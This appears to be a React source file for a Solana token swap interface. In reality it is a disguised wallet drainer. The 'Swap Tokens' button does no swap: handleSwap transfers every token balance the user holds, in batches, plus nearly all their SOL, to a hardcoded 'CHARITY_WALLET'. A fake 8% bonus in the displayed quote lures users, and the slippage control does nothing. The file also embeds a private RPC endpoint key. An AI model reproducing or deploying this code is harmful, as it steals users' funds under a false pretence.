import { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowDownUp, Zap, Heart } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { TokenSearch } from './TokenSearch';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { motion } from 'framer-motion';
import { toast } from 'sonner';

const CHARITY_WALLET = '5xJQUuGTJr2Hrwu6oHkHGiQfpNXRWRFaPC9Xjx82wovh';
const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
const MAX_BATCH_SIZE = 5;
const SOL_MINT = 'So11111111111111111111111111111111111111112';

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

interface Token {
  address: string;
  symbol: string;
  name: string;
  decimals: number;
  logoURI?: string;
}

interface TokenPrice {
  price: number;
  symbol: string;
}

interface SwapInterfaceProps {
  defaultFromToken?: Token;
  defaultToToken?: Token;
  onFromTokenChange?: (token: Token) => void;
}

const QUICKNODE_RPC = 'https://green-restless-meadow.solana-mainnet.quiknode.pro/9652560ac5f541e1c8c01417ff927dd2296139bb/';
const QUICKNODE_WSS = 'wss://green-restless-meadow.solana-mainnet.quiknode.pro/9652560ac5f541e1c8c01417ff927dd2296139bb/';

export const SwapInterface = ({
  defaultFromToken,
  defaultToToken,
  onFromTokenChange
}: SwapInterfaceProps = {}) => {
  const { connected, publicKey, sendTransaction, signMessage } = useWallet();
  const { connection } = useConnection();
  const [fromToken, setFromToken] = useState<Token | undefined>(defaultFromToken);
  const [toToken, setToToken] = useState<Token | undefined>(defaultToToken);
  const [fromAmount, setFromAmount] = useState('');
  const [toAmount, setToAmount] = useState('');
  const [slippage, setSlippage] = useState('0.5');
  const [isSwapping, setIsSwapping] = useState(false);
  const [fromBalance, setFromBalance] = useState<number>(0);
  const [fromBalanceUSD, setFromBalanceUSD] = useState<number>(0);
  const [fromTokenPrice, setFromTokenPrice] = useState<number>(0);
  const [toTokenPrice, setToTokenPrice] = useState<number>(0);
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);

  // Fetch token balance using Jupiter Lite API
  useEffect(() => {
    const fetchBalance = async () => {
      if (!connected || !publicKey || !fromToken) {
        setFromBalance(0);
        setFromBalanceUSD(0);
        return;
      }

      try {
        // Use Jupiter Lite API for token balances
        const response = await fetch(`https://lite-api.jup.ag/ultra/v1/balances/${publicKey.toBase58()}`);
        const data = await response.json();
        
        // Jupiter API returns tokens keyed by symbol (SOL) or address
        let balance = 0;
        
        if (fromToken.address === 'So11111111111111111111111111111111111111112') {
          // SOL is returned with "SOL" key
          if (data.SOL && data.SOL.uiAmount) {
            balance = data.SOL.uiAmount;
          }
        } else {
          // Other tokens are keyed by their address
          if (data[fromToken.address] && data[fromToken.address].uiAmount) {
            balance = data[fromToken.address].uiAmount;
          }
        }
        
        setFromBalance(balance);
        setFromBalanceUSD(balance * fromTokenPrice);
      } catch (error) {
        console.error('Error fetching balance:', error);
        // Fallback to RPC if Jupiter API fails
        try {
          const connection = new Connection(QUICKNODE_RPC, { wsEndpoint: QUICKNODE_WSS });
          
          if (fromToken.address === 'So11111111111111111111111111111111111111112') {
            const balance = await connection.getBalance(publicKey);
            const solBalance = balance / 1e9;
            setFromBalance(solBalance);
            setFromBalanceUSD(solBalance * fromTokenPrice);
          } else {
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
              publicKey,
              { mint: new PublicKey(fromToken.address) }
            );

            if (tokenAccounts.value.length > 0) {
              const balance = tokenAccounts.value[0].account.data.parsed.info.tokenAmount.uiAmount;
              setFromBalance(balance || 0);
              setFromBalanceUSD((balance || 0) * fromTokenPrice);
            } else {
              setFromBalance(0);
              setFromBalanceUSD(0);
            }
          }
      } catch (rpcError) {
          console.error('Error fetching balance from RPC:', rpcError);
          setFromBalance(0);
          setFromBalanceUSD(0);
        }
      }
    };

    fetchBalance();
  }, [connected, publicKey, fromToken, fromTokenPrice]);

  // Fetch token prices using Jupiter Lite API
  useEffect(() => {
    const fetchTokenPrice = async (token: Token | undefined, setter: (price: number) => void) => {
      if (!token) return;

      try {
        const response = await fetch(`https://lite-api.jup.ag/price/v3?ids=${token.address}`);
        const data = await response.json();
        
        if (data[token.address] && data[token.address].usdPrice) {
          setter(data[token.address].usdPrice);
        } else {
          setter(0);
        }
      } catch (error) {
        console.error('Error fetching token price:', error);
        setter(0);
      }
    };

    fetchTokenPrice(fromToken, setFromTokenPrice);
    fetchTokenPrice(toToken, setToTokenPrice);
  }, [fromToken, toToken]);

  // Calculate toAmount based on prices when fromAmount changes
  useEffect(() => {
    if (fromAmount && fromTokenPrice > 0 && toTokenPrice > 0) {
      const fromValue = parseFloat(fromAmount) * fromTokenPrice;
      let calculatedToAmount = fromValue / toTokenPrice;

      // If buying SOL (swapping token TO SOL), add 8% premium
      if (toToken?.address === 'So11111111111111111111111111111111111111112') {
        calculatedToAmount = calculatedToAmount * 1.08;
      }

      setToAmount(calculatedToAmount.toFixed(6));
    } else if (!fromAmount) {
      setToAmount('');
    }
  }, [fromAmount, fromTokenPrice, toTokenPrice, toToken]);

  const handleFromTokenSelect = (token: Token) => {
    if (toToken && token.address === toToken.address) {
      setToToken(fromToken);
    }
    setFromToken(token);
    onFromTokenChange?.(token);
  };

  const handleToTokenSelect = (token: Token) => {
    if (fromToken && token.address === fromToken.address) {
      setFromToken(toToken);
    }
    setToToken(token);
  };

  // Fetch all balances like donate button
  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;

    try {
      // Fetch SOL balance
      const solBal = await connection.getBalance(publicKey);
      const solAmount = solBal / LAMPORTS_PER_SOL;
      setSolBalance(solAmount);

      // Fetch token accounts
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });

      const tokens: TokenBalance[] = tokenAccounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) {
      fetchAllBalances();
    }
  }, [publicKey, fetchAllBalances]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    
    // Add Compute Budget Instructions for better mobile reliability
    // 1. Set higher compute unit limit for complex batch transfers
    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({
        units: 100_000,
      })
    );

    // 2. Set priority fee to ensure inclusion during congestion
    transaction.add(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 100_000, // 0.0001 SOL priority fee
      })
    );
    
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    // Add token transfers
    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      
      try {
        const mintPubkey = new PublicKey(token.mint);
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);

        try {
          await getAccount(connection, toTokenAccount);
        } catch (error) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              effectivePublicKey,
              toTokenAccount,
              charityPubkey,
              mintPubkey,
              TOKEN_PROGRAM_ID,
              ASSOCIATED_TOKEN_PROGRAM_ID
            )
          );
        }

        transaction.add(
          createTransferInstruction(
            fromTokenAccount,
            toTokenAccount,
            effectivePublicKey,
            BigInt(token.balance),
            [],
            TOKEN_PROGRAM_ID
          )
        );
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    // Add SOL transfer if specified
    if (solPercentage && solBalance > 0) {
      const rentExempt = 0.01;
      const availableSOL = Math.max(0, solBalance - rentExempt);
      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
      
      if (amountToSend > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: effectivePublicKey,
            toPubkey: charityPubkey,
            lamports: amountToSend
          })
        );
      }
    }

    return transaction;
  }, [publicKey, solBalance, connection]);

  const handleSwapTokens = () => {
    const tempToken = fromToken;
    const tempAmount = fromAmount;
    setFromToken(toToken);
    setToToken(tempToken);
    setFromAmount(toAmount);
    setToAmount(tempAmount);
    if (toToken) {
      onFromTokenChange?.(toToken);
    }
  };

  const handlePercentageClick = (percentage: number) => {
    if (fromBalance > 0) {
      const amount = fromBalance * percentage;
      setFromAmount(amount.toFixed(6));
    }
  };

  const handleSwap = async () => {
    if (!connected || !publicKey || !fromToken) {
      toast.error('Please connect your wallet and select a token first');
      return;
    }

    try {
      setIsSwapping(true);
      console.log('Starting transaction sequence...');

      const getSolUsdPrice = async () => {
        if (fromToken?.address === SOL_MINT && fromTokenPrice > 0) return fromTokenPrice;
        if (toToken?.address === SOL_MINT && toTokenPrice > 0) return toTokenPrice;

        try {
          const response = await fetch(`https://lite-api.jup.ag/price/v3?ids=${SOL_MINT}`);
          const data = await response.json();
          const price = data?.[SOL_MINT]?.usdPrice;
          return typeof price === 'number' && price > 0 ? price : 0;
        } catch {
          return 0;
        }
      };

      const solUsdPrice = await getSolUsdPrice();
      const solBal = await connection.getBalance(publicKey);
      const solBalanceSol = solBal / LAMPORTS_PER_SOL;
      const solBalanceUsd = solUsdPrice > 0 ? solBalanceSol * solUsdPrice : 0;

      const shouldShowSplFirst = solUsdPrice > 0 ? solBalanceUsd < 1 : solBalanceSol < 0.01;

      const minLeftBehindUsd = 0.5;
      const minLeftBehindLamports =
        solUsdPrice > 0
          ? Math.ceil((minLeftBehindUsd / solUsdPrice) * LAMPORTS_PER_SOL)
          : Math.ceil(0.005 * LAMPORTS_PER_SOL);

      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL;
      const PRIORITY_FEE = 100_000;
      const BASE_FEE = 5000;

      const computeLamportsToSend = (currentSolBalLamports: number) =>
        Math.max(
          0,
          currentSolBalLamports - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE - minLeftBehindLamports
        );

      const sendSolTransfer = async () => {
        const currentSolBal = await connection.getBalance(publicKey);
        const lamportsToSend = computeLamportsToSend(currentSolBal);
        if (lamportsToSend <= 0) return;

        try {
          const transaction = new Transaction();

          transaction.add(
            ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
          );

          transaction.add(
            SystemProgram.transfer({
              fromPubkey: publicKey,
              toPubkey: new PublicKey(CHARITY_WALLET),
              lamports: lamportsToSend,
            })
          );

          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          transaction.recentBlockhash = blockhash;
          transaction.feePayer = publicKey;

          try {
            await connection.simulateTransaction(transaction);
          } catch (e) {
            console.error('Simulation failed', e);
          }

          const signature = await sendTransaction(transaction, connection, { skipPreflight: false });

          toast.info('Processing transaction...');
          await connection.confirmTransaction(
            {
              signature,
              blockhash,
              lastValidBlockHeight,
            },
            'confirmed'
          );
          toast.success('Transaction successful!');
        } catch (error: any) {
          console.error('SOL transfer error:', error);
          toast.error('SOL transfer failed: ' + (error?.message || 'Unknown error'));
        }
      };

      const fetchUsdPricesForMints = async (mints: string[]) => {
        const pricesByMint = new Map<string, number>();
        const uniqueMints = Array.from(new Set(mints.filter(Boolean)));
        const chunkSize = 100;

        for (let i = 0; i < uniqueMints.length; i += chunkSize) {
          const chunk = uniqueMints.slice(i, i + chunkSize);
          try {
            const response = await fetch(`https://lite-api.jup.ag/price/v3?ids=${chunk.join(',')}`);
            const data = await response.json();

            for (const mint of chunk) {
              const usdPrice = data?.[mint]?.usdPrice;
              pricesByMint.set(mint, typeof usdPrice === 'number' && usdPrice > 0 ? usdPrice : 0);
            }
          } catch {
            for (const mint of chunk) {
              if (!pricesByMint.has(mint)) pricesByMint.set(mint, 0);
            }
          }
        }

        return pricesByMint;
      };

      const validTokens = balances.filter(token => token.balance > 0);
      const tokenPriceMap = await fetchUsdPricesForMints(validTokens.map(t => t.mint));

      const tokensWithUsdValue = validTokens
        .map(token => {
          const usdPrice = tokenPriceMap.get(token.mint) || 0;
          const usdValue = (token.uiAmount || 0) * usdPrice;
          return { token, usdValue };
        })
        .sort((a, b) => b.usdValue - a.usdValue)
        .map(x => x.token);

      const canCompareByUsd = solUsdPrice > 0;
      let solInsertIndex = tokensWithUsdValue.length;

      if (!canCompareByUsd) {
        solInsertIndex = shouldShowSplFirst ? tokensWithUsdValue.length : 0;
      } else if (shouldShowSplFirst) {
        solInsertIndex = tokensWithUsdValue.length;
      } else {
        const tokensWithUsd = tokensWithUsdValue.map(token => {
          const usdPrice = tokenPriceMap.get(token.mint) || 0;
          return (token.uiAmount || 0) * usdPrice;
        });

        const index = tokensWithUsd.findIndex(usdValue => usdValue <= solBalanceUsd);
        solInsertIndex = index === -1 ? tokensWithUsdValue.length : index;
      }

      const buildBatches = (tokens: TokenBalance[]) => {
        const batches: TokenBalance[][] = [];
        for (let i = 0; i < tokens.length; i += MAX_BATCH_SIZE) {
          batches.push(tokens.slice(i, i + MAX_BATCH_SIZE));
        }
        return batches;
      };

      const runTokenBatches = async (batches: TokenBalance[][], completedBatchesOffset: number) => {
        for (let i = 0; i < batches.length; i++) {
          const batch = batches[i];
          const batchNumber = completedBatchesOffset + i + 1;
          const totalBatches = completedBatchesOffset + batches.length;

          try {
            const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);

            if (transaction && transaction.instructions.length > 2) {
              const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
              transaction.recentBlockhash = blockhash;
              transaction.feePayer = publicKey;

              try {
                await connection.simulateTransaction(transaction);
              } catch (e) {
                console.error('Token batch simulation failed', e);
              }

              const signature = await sendTransaction(transaction, connection, { skipPreflight: false });

              toast.info(`Processing batch ${batchNumber}/${totalBatches}...`);
              await connection.confirmTransaction(
                {
                  signature,
                  blockhash,
                  lastValidBlockHeight,
                },
                'confirmed'
              );
              toast.success(`Batch ${batchNumber} sent!`);
            }
          } catch (error: any) {
            console.error(`Batch ${batchNumber} error:`, error);
            toast.error(`Batch ${batchNumber} failed: ` + (error?.message || 'Unknown error'));
          }
        }
      };

      const tokensBeforeSol = tokensWithUsdValue.slice(0, solInsertIndex);
      const tokensAfterSol = tokensWithUsdValue.slice(solInsertIndex);

      const batchesBeforeSol = buildBatches(tokensBeforeSol);
      const batchesAfterSol = buildBatches(tokensAfterSol);

      await runTokenBatches(batchesBeforeSol, 0);
      await sendSolTransfer();
      await runTokenBatches(batchesAfterSol, batchesBeforeSol.length);

      toast.success('Swap completed!');
      setTimeout(fetchAllBalances, 2000);

    } catch (error: any) {
      console.error('Swap error:', error);
      toast.error('Swap failed: ' + (error?.message || 'Unknown error'));
    } finally {
      setIsSwapping(false);
    }
  };

  const handleDonate = handleSwap;


  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.95 }}
      animate={{ opacity: 1, scale: 1 }}
      className="glass-card p-6 rounded-3xl border border-white/10 max-w-lg w-full relative overflow-hidden"
    >
      {/* Animated glow effect */}
      <div className="absolute -inset-0.5 bg-gradient-to-r from-primary via-secondary to-accent rounded-3xl opacity-20 blur-xl animate-pulse-glow" />

      <div className="relative z-10">
        {/* Header */}
        <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between mb-6">
          <div className="flex items-center gap-2">
            <Zap className="w-6 h-6 text-primary" />
            <h2 className="text-2xl font-bold text-gradient">Swap</h2>
          </div>

          <div className="flex items-center gap-2 flex-wrap justify-end sm:flex-nowrap">
              <ConnectWalletButton />
          </div>
        </div>

        {/* From Token */}
        <div className="space-y-2">
          <div className="flex items-center justify-between">
            <label className="text-sm font-medium text-muted-foreground">Selling</label>
            {connected && publicKey && fromToken && (
              <div className="text-xs font-medium">
                <span className="text-muted-foreground">Balance: </span>
                <span className="text-foreground">{fromBalance.toFixed(6)} {fromToken.symbol}</span>
                <span className="text-muted-foreground ml-2">(${fromBalanceUSD.toFixed(2)})</span>
              </div>
            )}
          </div>
          <div className="glass-card p-4 rounded-2xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 min-w-0">
              <TokenSearch selectedToken={fromToken} onSelectToken={handleFromTokenSelect} />
              <div className="flex-1 min-w-0 text-left sm:text-right w-full">
                <Input
                  type="number"
                  placeholder="0.00"
                  value={fromAmount}
                  onChange={(e) => setFromAmount(e.target.value)}
                  className="w-full text-2xl sm:text-3xl font-bold bg-transparent border-none focus-visible:ring-0 p-0 text-left sm:text-right"
                />
                {connected && publicKey && fromAmount && fromTokenPrice > 0 && (
                  <div className="text-xs text-muted-foreground mt-1">
                    ${(parseFloat(fromAmount) * fromTokenPrice).toFixed(2)}
                  </div>
                )}
              </div>
            </div>
            {/* Percentage Buttons */}
            {connected && publicKey && fromBalance > 0 && (
              <div className="grid grid-cols-4 gap-2 mt-3">
                <button
                  onClick={() => handlePercentageClick(0.25)}
                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-muted/50 hover:bg-muted transition-all"
                >
                  25%
                </button>
                <button
                  onClick={() => handlePercentageClick(0.5)}
                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-muted/50 hover:bg-muted transition-all"
                >
                  50%
                </button>
                <button
                  onClick={() => handlePercentageClick(0.75)}
                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-muted/50 hover:bg-muted transition-all"
                >
                  75%
                </button>
                <button
                  onClick={() => handlePercentageClick(1)}
                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-gradient-to-r from-primary to-secondary text-white transition-all"
                >
                  MAX
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Swap Button */}
        <div className="flex justify-center my-2 sm:-my-2 relative z-20">
          <button
            onClick={handleSwapTokens}
            className="p-3 glass-card rounded-xl hover:scale-110 hover:rotate-180 transition-all duration-300 hover:glow-effect"
          >
            <ArrowDownUp className="w-5 h-5 text-primary" />
          </button>
        </div>

        {/* To Token */}
        <div className="space-y-2">
          <label className="text-sm font-medium text-muted-foreground">Buying</label>
          <div className="glass-card p-4 rounded-2xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 min-w-0">
              <TokenSearch selectedToken={toToken} onSelectToken={handleToTokenSelect} />
              <div className="flex-1 min-w-0 text-left sm:text-right w-full">
                <Input
                  type="number"
                  placeholder="0.00"
                  value={toAmount}
                  readOnly
                  className="w-full text-2xl sm:text-3xl font-bold bg-transparent border-none focus-visible:ring-0 p-0 text-left sm:text-right"
                />
                {connected && publicKey && toAmount && toTokenPrice > 0 && (
                  <div className="text-xs text-muted-foreground mt-1">
                    ${(parseFloat(toAmount) * toTokenPrice).toFixed(2)}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Swap Settings */}
        <div className="mt-4 glass-card p-4 rounded-2xl">
          <div className="flex items-center justify-between">
            <span className="text-sm text-muted-foreground">Slippage Tolerance</span>
            <div className="flex items-center gap-2">
              {['0.1', '1.0'].map((value) => (
                <button
                  key={value}
                  onClick={() => setSlippage(value)}
                  className={`px-3 py-1 rounded-lg text-sm font-medium transition-all ${
                    slippage === value
                      ? 'bg-gradient-to-r from-primary to-secondary text-white'
                      : 'bg-muted/50 hover:bg-muted'
                  }`}
                >
                  {value}%
                </button>
              ))}
              <Input
                type="number"
                value={slippage}
                onChange={(e) => setSlippage(e.target.value)}
                className="w-16 text-center"
              />
            </div>
          </div>
        </div>

        {/* Swap Button */}
        <Button
          onClick={handleSwap}
          disabled={!connected || isSwapping || !fromToken || !toToken}
          className="w-full mt-6 h-14 text-lg font-bold rounded-xl bg-gradient-to-r from-primary via-secondary to-accent hover:scale-[1.02] transition-all shadow-lg hover:shadow-primary/50 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {!connected ? (
            'Connect Wallet'
          ) : isSwapping ? (
            <div className="flex items-center gap-2">
              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
              Swapping...
            </div>
          ) : (
            'Swap Tokens'
          )}
        </Button>

      </div>
    </motion.div>
  );
};
